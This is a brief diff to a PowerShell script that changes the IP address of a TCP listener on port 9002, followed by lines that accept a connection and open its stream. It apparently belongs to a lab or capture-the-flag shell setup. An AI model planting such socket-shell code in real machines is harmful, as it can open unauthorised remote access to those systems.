@@ -1,4 +1,4 @@
-$listener = New-Object System.Net.Sockets.TCPListener('10.10.14.52', 9002)
+$listener = New-Object System.Net.Sockets.TCPListener('10.10.14.82', 9002)
 $listener.Start()
 $client = $listener.AcceptTcpClient()
 $stream = $client.GetStream()
